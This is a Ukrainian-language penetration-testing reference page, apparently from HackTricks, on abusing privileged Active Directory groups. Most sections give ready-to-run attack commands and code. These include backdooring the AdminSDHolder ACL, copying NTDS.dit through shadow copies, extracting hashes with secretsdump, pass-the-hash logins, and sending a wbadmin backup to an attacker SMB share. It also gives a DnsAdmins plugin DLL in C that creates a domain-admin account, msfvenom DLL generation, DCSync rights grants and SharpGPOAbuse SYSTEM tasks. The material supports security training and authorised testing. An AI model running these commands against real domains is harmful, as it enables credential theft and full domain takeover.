# Привілейовані групи

{{#include ../../banners/hacktricks-training.md}}

## Відомі групи з адміністративними привілеями

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ця група має право створювати облікові записи та групи, які не є адміністраторами домену. Крім того, вона дає змогу виконувати локальний вхід на контролер домену (DC).

Щоб визначити учасників цієї групи, виконайте таку команду:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

Додавати нових користувачів дозволено, так само як і входити локально на DC.<sup>[[1]](#references)</sup>

Умовний шлях від керування обліковими записами до доступу локального адміністратора — це **звичайна група, якій делеговано читання пароля LAPS комп’ютера**. Перевірте ефективні права на зміну членства саме в цій групі, чи захищена вона, а також чи може новий або контрольований обліковий запис справді приєднатися до неї. Перед перевіркою дозволу на читання LAPS цільового комп’ютера оновіть токен облікового запису. Для зашифрованого Windows LAPS право читання в каталозі та право розшифрування пароля — це окремі вимоги; членство в групі або членство в Account Operators саме по собі не забезпечує жодного з них. Див. [обсяг повноважень Account Operators у Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) і [делегування Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Група AdminSDHolder

Список керування доступом (ACL) групи **AdminSDHolder** має вирішальне значення, оскільки він визначає дозволи для всіх «захищених груп» в Active Directory, зокрема груп із високими привілеями. Цей механізм забезпечує безпеку цих груп, запобігаючи несанкціонованим змінам.

Зловмисник може скористатися цим, змінивши ACL групи **AdminSDHolder** і надавши звичайному користувачеві повні дозволи. Фактично це дасть цьому користувачеві повний контроль над усіма захищеними групами. Якщо дозволи цього користувача змінити або видалити, через особливості системи їх буде автоматично відновлено протягом години.<sup>[[14]](#references)</sup>

У недавній документації Windows Server кілька вбудованих груп операторів і досі вважаються **захищеними** об’єктами (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` тощо). Процес **SDProp** запускається на **PDC Emulator** кожні 60 хвилин за замовчуванням, встановлює `adminCount=1` і вимикає успадкування для захищених об’єктів. Це корисно як для закріплення в системі, так і для пошуку застарілих привілейованих користувачів, яких видалили із захищеної групи, але в яких досі зберігся ACL без успадкування.<sup>[[12]](#references)</sup>

Команди для перевірки учасників і зміни дозволів:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Доступний скрипт, що пришвидшує процес відновлення: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Докладніше див. на [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Видимість видалених об’єктів визначається ефективними дозволами каталогу; сама назва групи не доводить, що поточна ідентичність може переглядати або відновлювати об’єкт. Для повного відновлення AD Recycle Bin має бути ввімкнено до видалення, а для відновлення також потрібні права Reanimate-Tombstones на кореневому об’єкті контексту іменування, права на перейменування та CREATE_CHILD у контейнері призначення. [Рекомендації Microsoft щодо Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) і [правила авторизації для скасування видалення](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) розрізняють ці умови. Ідентичність із дозволом на читання видалених об’єктів може переглядати записи, які можуть містити конфіденційну інформацію:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Це корисно для **відновлення попередніх шляхів до привілеїв**. Видалені об'єкти все ще можуть розкривати `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, старі SPN або DN видаленої привілейованої групи, яку згодом може відновити інший оператор.

Атрибути, визначені програмою, також можуть зберігати старі облікові дані, поки об'єкт перебуває у видаленому стані. Розглядайте це як окремий напрям перевірки: поточна ідентичність має мати дозвіл перераховувати видалений об'єкт **і** читати цей атрибут, значення має бути придатними для використання обліковими даними, а активний принципал має їх приймати. Членство в групі чи сама назва видаленого облікового запису не підтверджують жодного з цих кроків; під час звичайного перерахування не виводьте значення облікових даних. [Документація Microsoft про Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) описує збереження атрибутів після видалення.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Доступ до контролера домену

Доступ до файлів на DC обмежений, якщо користувач не входить до групи `Server Operators`, членство в якій змінює рівень доступу.

### Підвищення привілеїв

За допомогою `PsService` або `sc` із Sysinternals можна перевіряти та змінювати дозволи служб. Наприклад, група `Server Operators` має повний контроль над деякими службами, що дає змогу виконувати довільні команди та підвищувати привілеї:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

This command reveals that `Server Operators` мають повний доступ, що дає змогу маніпулювати службами для отримання підвищених привілеїв.

## Backup Operators

Членство в `Backup Operators` може надавати `SeBackupPrivilege` і `SeRestorePrivilege` на хості залежно від локальної політики та сеансу входу. Перевірте **ефективний токен процесу, що виконує команди**, за допомогою `whoami /groups` і `whoami /priv`: саме членство в групі не доводить, що `SeBackupPrivilege` присутній і ввімкнений. Якщо привілей присутній, але вимкнений, його можна ввімкнути в цьому токені; якщо його немає або його вилучено, ці операції резервного копіювання не зможуть його використовувати. `SeBackupPrivilege` дає змогу виконувати захищене **читання** через API з підтримкою резервного копіювання (наприклад, `FILE_FLAG_BACKUP_SEMANTICS` або `robocopy /B`); `SeRestorePrivilege` — це окремий привілей для операцій відновлення/запису. Звичайне отримання списку каталогів і копіювання не обов’язково використовують семантику резервного копіювання.<sup>[[1]](#references)</sup>

Щоб отримати список учасників групи, виконайте:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Локальна атака

На хості, де ефективний токен має `SeBackupPrivilege`, наведене нижче копіювання з підтримкою резервного копіювання може прочитати захищений файл:

1. Імпортуйте необхідні бібліотеки:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Якщо привілей наявний, але вимкнений, увімкніть його та перевірте його стан у цьому процесі:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Скопіюйте файл з обмеженого каталогу, наприклад:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### Атака на AD

`NTDS.dit` — це база даних Active Directory на **контролері домену (DC)**. Для цього способу потрібен відповідний токен на DC і доступ до тому, що містить базу даних; членство в Backup Operators на іншому комп’ютері не надає доступу до конкретного DC. Активна база даних зазвичай заблокована, тому перед копіюванням скористайтеся доступною тіньовою копією або іншою системою резервного копіювання. Створення або відкриття тіньової копії також залежить від конфігурації VSS на хості та прав виклику. У прикладі нижче передбачається, що DC зберігає `NTDS.dit` на `C:` у `\Windows\NTDS`; якщо це не так, змініть том і шлях.

#### Using diskshadow.exe

1. Якщо це дозволено, створіть тіньову копію диска `C:` на DC і підключіть її як `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Скопіюйте `NTDS.dit` із тіньової копії:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Або використовуйте `robocopy` для копіювання файлів:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Збережіть кущ реєстру `SYSTEM` контролера домену для офлайн-вилучення. `SAM` — це локальна база даних облікових записів на системах-членах; кущ реєстру `SAM` контролера домену не є заміною `NTDS.dit` і не містить хешу доменного Administrator:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Перенесіть `ntds.dit` і `SYSTEM.SAV` на хост аналізу та витягніть хеші облікових записів домену. Збережений hive `SAM` із системи-члена домену разом із відповідним hive `SYSTEM` дає хеші локальних облікових записів:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Якщо hash **адміністратора домену** було отримано з `NTDS.dit`, його можна перевірити для автентифікації в домені. Локальний hash адміністратора з `SAM.SAV` — це інші облікові дані, які не дають змоги автентифікуватися як адміністратор домену.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Використання wbadmin.exe

1. Налаштуйте файлову систему NTFS для SMB-сервера на машині атакувальника та кешуйте облікові дані SMB на цільовій машині.
2. Використайте `wbadmin.exe` для резервного копіювання системи та вилучення `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Для практичної демонстрації дивіться [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Учасники групи **DnsAdmins** можуть скористатися своїми привілеями, щоб завантажити довільну DLL із привілеями SYSTEM на DNS-сервер, який часто розміщено на контролерах домену. Ця можливість відкриває значний потенціал для експлуатації.

Щоб переглянути учасників групи DnsAdmins, скористайтеся командою:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Виконання довільної DLL (CVE‑2021‑40469)

> [!NOTE]
> Ця вразливість дає змогу виконувати довільний код із привілеями SYSTEM у службі DNS (зазвичай на контролерах домену). Цю проблему було виправлено у 2021 році.

Учасники групи можуть змусити DNS-сервер завантажити довільну DLL (локально або з віддаленого спільного ресурсу) за допомогою таких команд:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Перезапуск служби DNS (для чого можуть знадобитися додаткові дозволи) необхідний, щоб DLL було завантажено:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Щоб дізнатися більше про цей вектор атаки, зверніться до ired.team.

#### Mimilib.dll

Також можна використовувати mimilib.dll для виконання команд, змінивши його так, щоб він виконував певні команди або запускав reverse shell. [Перегляньте цю публікацію](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), щоб дізнатися більше.<sup>[[15]](#references)</sup>

### Запис WPAD для MitM

DnsAdmins можуть змінювати DNS-записи для проведення атак Man-in-the-Middle (MitM), створивши запис WPAD після вимкнення глобального списку блокування запитів. Для підміни та перехоплення мережевого трафіку можна використовувати такі інструменти, як Responder або Inveigh.

### Читачі журналів подій
Учасники можуть отримати доступ до журналів подій і потенційно знайти конфіденційну інформацію, як-от паролі у відкритому тексті або відомості про виконання команд:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Exchange Windows Permissions

Ця група може змінювати DACL об’єкта домену, потенційно надаючи привілеї DCSync. Техніки підвищення привілеїв із використанням цієї групи докладно описані в GitHub-репозиторії Exchange-AD-Privesc.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Якщо ви можете діяти як учасник цієї групи, класичний спосіб зловживання — надати підконтрольному зловмиснику суб’єкту права реплікації, необхідні для [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Історично **PrivExchange** поєднував доступ до поштової скриньки, примусову автентифікацію Exchange та LDAP relay, щоб отримати той самий примітив. Навіть якщо цей шлях relay усунуто, пряме членство в `Exchange Windows Permissions` або контроль над сервером Exchange залишаються цінним шляхом до прав реплікації домену.

## Hyper-V Administrators

Учасники групи Hyper-V Administrators мають повний доступ до Hyper-V, що можна використати для отримання контролю над віртуалізованими контролерами домену. Це включає клонування запущених DC і вилучення NTLM-хешів із файлу NTDS.dit.

### Приклад експлуатації

На практиці зазвичай зловживають **офлайн-доступом до дисків/контрольних точок DC**, а не застарілими LPE-трюками на рівні хоста. Маючи доступ до хоста Hyper-V, оператор може створити контрольну точку віртуалізованого контролера домену або експортувати його, підключити VHDX і вилучити `NTDS.dit`, `SYSTEM` та інші секрети, не торкаючись LSASS усередині гостьової системи:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

Звідти повторно використайте workflow `Backup Operators`, щоб скопіювати `Windows\NTDS\ntds.dit` і кущі реєстру в автономному режимі. Пов’язаний workflow для файлів резервних копій:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Ця група дозволяє учасникам створювати Group Policies у домені. Однак її учасники не можуть застосовувати групові політики до користувачів або груп, а також редагувати наявні GPO.

Важливий нюанс полягає в тому, що **творець стає власником нової GPO** і зазвичай отримує достатньо прав, щоб згодом її редагувати. Це означає, що ця група цікава, якщо ви можете:

- створити шкідливу GPO і переконати адміністратора прив’язати її до цільового OU/домену
- відредагувати створену вами GPO, яка вже прив’язана в корисному місці
- зловживати іншим делегованим правом, що дозволяє прив’язувати GPO, використовуючи цю групу для редагування

Практичне зловживання зазвичай полягає в додаванні **Immediate Task**, **startup script**, **local admin membership** або зміні **user rights assignment** через файли політик у SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Якщо редагуєте GPO вручну через `SYSVOL`, пам’ятайте: самих змін недостатньо — потрібно також оновити `versionNumber`, `GPT.ini` і, іноді, `gPCMachineExtensionNames`, інакше клієнти ігноруватимуть оновлення політики.<sup>[[9]](#references)</sup>

## Керування організацією

У середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група **Organization Management** має значні можливості. Ця привілейована група має право **доступу до поштових скриньок усіх користувачів домену** та **повний контроль над** Organizational Unit (OU) **'Microsoft Exchange Security Groups'**. Цей контроль охоплює групу **`Exchange Windows Permissions`**, яку можна використати для підвищення привілеїв.

### Експлуатація привілеїв і команди

#### Print Operators

Учасники групи **Print Operators** мають кілька привілеїв, зокрема **`SeLoadDriverPrivilege`**, який дозволяє їм **локально входити на Domain Controller**, вимикати його та керувати принтерами. Щоб скористатися цими привілеями, особливо якщо **`SeLoadDriverPrivilege`** не відображається в контексті без підвищених прав, необхідно обійти User Account Control (UAC).<sup>[[1]](#references)</sup>

Щоб переглянути учасників цієї групи, використовується така команда PowerShell:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

На контролерах домену ця група небезпечна, оскільки типова політика контролера домену надає **`SeLoadDriverPrivilege`** групі `Print Operators`. Якщо ви отримаєте підвищений токен для учасника цієї групи, ви зможете ввімкнути цей привілей і завантажити підписаний, але вразливий драйвер, щоб отримати доступ до kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Докладніше про роботу з токенами див. у розділі [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Учасники цієї групи отримують доступ до ПК через Remote Desktop Protocol (RDP). Для переліку цих учасників доступні команди PowerShell:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Додаткові відомості про експлуатацію RDP можна знайти в спеціалізованих ресурсах із pentesting.

#### Користувачі віддаленого керування

Учасники можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перелік цих учасників можна отримати за допомогою:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Для технік експлуатації, пов’язаних із **WinRM**, слід звернутися до відповідної документації.

#### Server Operators

Ця група має дозволи на виконання різних налаштувань на контролерах домену, зокрема дозволи на резервне копіювання та відновлення, зміну системного часу й вимкнення системи.<sup>[[1]](#references)</sup> Щоб перелічити учасників, використовується така команда:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

На Domain Controller, група `Server Operators` зазвичай успадковує достатньо прав, щоб **переналаштовувати служби або запускати/зупиняти їх**, а також отримує `SeBackupPrivilege`/`SeRestorePrivilege` через стандартну політику DC. На практиці це дає змогу використовувати її як міст між **зловживанням керуванням службами** та **вилученням NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

Неможливість переглянути список служб не виключає доступу до **відомої служби**. Service Control Manager окремо перевіряє `SC_MANAGER_ENUMERATE_SERVICE` для перегляду списку та `SC_MANAGER_CONNECT`; відкриття служби за назвою перевіряє її власні права, зокрема `SERVICE_CHANGE_CONFIG` і `SERVICE_START`. Перевірте ефективний токен і ACL цієї служби, навіть якщо загальна команда `sc.exe query` завершується помилкою. Самі лише права на конфігурацію — це лише привід для подальшої перевірки: чи можлива ескалація до вищих привілеїв, також залежить від ідентичності служби, прав на запуск і зупинку та наявності робочого тригера. Див. [довідник Microsoft з прав доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Якщо ACL служби надає цій групі права на зміну конфігурації та запуск, вкажіть для служби довільну команду, запустіть її від імені `LocalSystem`, а потім відновіть початкове значення `binPath`. Якщо керування службами обмежене, скористайтеся наведеними вище методами з `Backup Operators`, щоб скопіювати `NTDS.dit`.

## References

- [1] [ired.team – Привілейовані облікові записи та привілеї токенів](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Зловживання SeLoadDriverPrivilege для ескалації привілеїв](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Зловживання дозволами GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Зловживання GPO, частина 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Посібник Red Teamer з GPO та OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Функція ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — анонімний LDAP → password spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Додаток C: Захищені облікові записи та групи в Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Як зловживати AdminSDHolder і створити в ньому бекдор для отримання постійного доступу рівня Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Зловживання привілеєм DnsAdmins для ескалації в Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Інформація про зловживання зв’язком GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Функція NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
